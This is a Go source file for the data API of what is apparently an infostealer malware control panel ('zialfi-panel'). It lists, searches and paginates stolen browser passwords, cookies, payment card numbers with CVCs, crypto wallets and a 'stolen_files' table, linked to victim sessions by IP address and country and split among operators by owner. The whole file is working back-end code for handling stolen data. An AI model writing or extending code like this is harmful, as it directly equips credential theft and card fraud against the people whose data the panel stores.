package api

import (
	"database/sql"
	"net/http"
	"strconv"
	"strings"

	"zialfi-panel/internal/db"
	"zialfi-panel/internal/middleware"
)

// DataHandler serves per-type data tables (passwords, cookies, cards,
// wallets, files) joined with their session for country/date/owner scoping.
// Tenant-scoped: non-admins only see rows belonging to their own sessions,
// mirroring SessionsHandler.List.
type DataHandler struct {
	db       *sql.DB
	provider db.ProviderType
}

func NewDataHandler(d *sql.DB, provider db.ProviderType) *DataHandler {
	return &DataHandler{db: d, provider: provider}
}

// dataColumn describes one queryable type's table + fields.
type dataColumn struct {
	table   string // source table name
	idField string // primary key column
	fields  string // columns selected in items query
	search  []string // columns matched by the q param
}

var dataColumns = map[string]dataColumn{
	"passwords": {
		table:   "passwords",
		idField: "id",
		fields:  "p.id, p.session_id, p.url, p.username, p.password_value, p.browser",
		search:  []string{"p.url", "p.username", "p.password_value"},
	},
	"cookies": {
		table:   "cookies",
		idField: "id",
		fields:  "c.id, c.session_id, c.domain, c.name, c.value, c.path",
		search:  []string{"c.domain", "c.name", "c.value"},
	},
	"cards": {
		table:   "cards",
		idField: "id",
		fields:  "c.id, c.session_id, c.number, c.exp_month, c.exp_year, c.holder, c.cvc",
		search:  []string{"c.holder", "c.number"},
	},
	"wallets": {
		table:   "wallets",
		idField: "id",
		fields:  "w.id, w.session_id, w.name, w.path",
		search:  []string{"w.name", "w.path"},
	},
	"files": {
		table:   "stolen_files",
		idField: "id",
		fields:  "f.id, f.session_id, f.filename, f.size",
		search:  []string{"f.filename"},
	},
}

// dataAliases maps type -> table alias used in JOIN clauses.
var dataAliases = map[string]string{
	"passwords":   "p",
	"cookies":     "c",
	"cards":       "c",
	"wallets":     "w",
	"files":        "f",
}

var dataSorts = map[string]string{
	"created_at": "s.created_at",
	"session":    "s.id",
	"url":        "p.url",
	"domain":     "c.domain",
	"name":       "c.name",
	"filename":   "f.filename",
	"size":       "f.size",
}

// List serves GET /api/data/{type}?page=&limit=&q=&country=&sort=
func (h *DataHandler) List(w http.ResponseWriter, r *http.Request) {
	typ := strings.TrimPrefix(r.URL.Path, "/api/data/")
	typ = strings.TrimSuffix(typ, "/")
	col, ok := dataColumns[typ]
	if !ok {
		writeError(w, http.StatusNotFound, "unknown data type")
		return
	}

	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
	if page < 1 {
		page = 1
	}
	limit, _ := strconv.Atoi(r.URL.Query().Get("limit"))
	if limit < 1 {
		limit = 50
	}
	if limit > 200 {
		limit = 200
	}
	offset := (page - 1) * limit

	alias := dataAliases[typ]

	// WHERE clauses
	var conds []string
	var args []any

	if q := strings.TrimSpace(r.URL.Query().Get("q")); q != "" {
		like := "%" + q + "%"
		var searchConds []string
		for _, f := range col.search {
			searchConds = append(searchConds, f+" LIKE ?")
			args = append(args, like)
		}
		conds = append(conds, "("+strings.Join(searchConds, " OR ")+")")
	}

	if country := strings.TrimSpace(r.URL.Query().Get("country")); country != "" {
		conds = append(conds, "s.country_code = ?")
		args = append(args, country)
	}

	// Tenant scope: non-admins only see their own sessions' data.
	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		conds = append(conds, "s.owner_id = ?")
		args = append(args, claims.UserID)
	}

	where := ""
	if len(conds) > 0 {
		where = "WHERE " + strings.Join(conds, " AND ")
	}

	join := "JOIN sessions s ON s.id = " + alias + ".session_id"

	// Count
	var total int
	countQuery := "SELECT COUNT(*) FROM " + col.table + " " + alias + " " + join + " " + where
	if err := db.QueryRow(h.db, h.provider, countQuery, args...).Scan(&total); err != nil {
		writeError(w, http.StatusInternalServerError, "count failed")
		return
	}

	// Sort
	sortField := "s.created_at"
	dir := "DESC"
	if sortParam := r.URL.Query().Get("sort"); sortParam != "" {
		if strings.HasPrefix(sortParam, "-") {
			dir = "DESC"
			sortParam = strings.TrimPrefix(sortParam, "-")
		} else {
			dir = "ASC"
		}
		if mapped, ok := dataSorts[sortParam]; ok {
			sortField = mapped
		}
	}

	query := "SELECT " + col.fields + ", s.country_code, s.ip, s.created_at FROM " + col.table + " " + alias +
		" " + join + " " + where + " ORDER BY " + sortField + " " + dir + " LIMIT ? OFFSET ?"
	rows, err := db.Query(h.db, h.provider, query, append(args, limit, offset)...)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "query failed")
		return
	}
	defer rows.Close()

	type row struct {
		ID         string `json:"id"`
		SessionID  string `json:"session_id"`
		URL        string `json:"url,omitempty"`
		Username   string `json:"username,omitempty"`
		Password   string `json:"password_value,omitempty"`
		Browser    string `json:"browser,omitempty"`
		Domain     string `json:"domain,omitempty"`
		Name       string `json:"name,omitempty"`
		Value      string `json:"value,omitempty"`
		Path       string `json:"path,omitempty"`
		Number     string `json:"number,omitempty"`
		ExpMonth   string `json:"exp_month,omitempty"`
		ExpYear    string `json:"exp_year,omitempty"`
		Holder     string `json:"holder,omitempty"`
		Cvc        string `json:"cvc,omitempty"`
		Filename   string `json:"filename,omitempty"`
		Size       int64  `json:"size"`
		Country    string `json:"country_code,omitempty"`
		IP         string `json:"ip,omitempty"`
		CreatedAt  string `json:"created_at"`
	}

	items := make([]row, 0, limit)
	for rows.Next() {
		var it row
		var country, ip, createdAt string
		switch typ {
		case "passwords":
			err = rows.Scan(&it.ID, &it.SessionID, &it.URL, &it.Username, &it.Password, &it.Browser, &country, &ip, &createdAt)
		case "cookies":
			err = rows.Scan(&it.ID, &it.SessionID, &it.Domain, &it.Name, &it.Value, &it.Path, &country, &ip, &createdAt)
		case "cards":
			err = rows.Scan(&it.ID, &it.SessionID, &it.Number, &it.ExpMonth, &it.ExpYear, &it.Holder, &it.Cvc, &country, &ip, &createdAt)
		case "wallets":
			err = rows.Scan(&it.ID, &it.SessionID, &it.Name, &it.Path, &country, &ip, &createdAt)
		case "files":
			err = rows.Scan(&it.ID, &it.SessionID, &it.Filename, &it.Size, &country, &ip, &createdAt)
		}
		if err != nil {
			writeError(w, http.StatusInternalServerError, "scan failed")
			return
		}
		it.Country = country
		it.IP = ip
		it.CreatedAt = createdAt
		items = append(items, it)
	}
	if err := rows.Err(); err != nil {
		writeError(w, http.StatusInternalServerError, "rows failed")
		return
	}

	pages := (total + limit - 1) / limit
	writeJSON(w, http.StatusOK, map[string]any{
		"items": items,
		"total": total,
		"page":  page,
		"limit": limit,
		"pages": pages,
	})
}
